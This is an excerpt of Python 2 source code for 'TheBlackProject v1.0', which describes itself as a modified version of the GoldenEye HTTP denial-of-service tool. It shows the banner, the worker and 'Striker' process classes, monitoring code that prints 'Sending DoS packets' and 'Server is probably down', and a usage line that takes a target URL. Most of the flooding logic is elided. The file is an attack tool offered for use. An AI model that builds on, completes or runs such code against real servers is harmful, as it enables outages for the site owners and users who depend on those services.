...
@author Manal Shaikh <http://teamultimate.in>

@Releast date 10-05-2017
@version 1.0
...
GOLDENEYE_BANNER = 'TheBlackProject v1.0 by Manal Shaikh <admin@shieldsec.org> The modified version of GoldenEye.'
...
class GoldenEye(object):
    ...
    def exit(self):
        self.stats()
        print "Shutting down the attack machine"
    ...
    def fire(self):
        ...
        self.printHeader()
        print "Sending DoS packets in mode '{0}' with {1} connections running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "Starting {0} workers".format(self.nr_workers)
    ...
    def stats(self):
        ...
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                ...
                print "{0} BlackProject strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\tServer is probably down or the packets are not being send."
    ...
    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                ...
                print "CTRL+C received. Killing all Connections"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Killing Connections {0}".format(worker.name)
                        #worker.terminate()
                        worker.stop()
                    except Exception, ex:
                        pass # silently ignore
...
class Striker(Process):
    ...
    def run(self):
        ...
        if DEBUG:
            print "Starting connections {0}".format(self.name)
...
def usage():
    ...
    print GOLDENEYE_BANNER
    print 
    print ' USAGE: ./blackproject.py <url> [OPTIONS]'
    print
    print ' OPTIONS:'
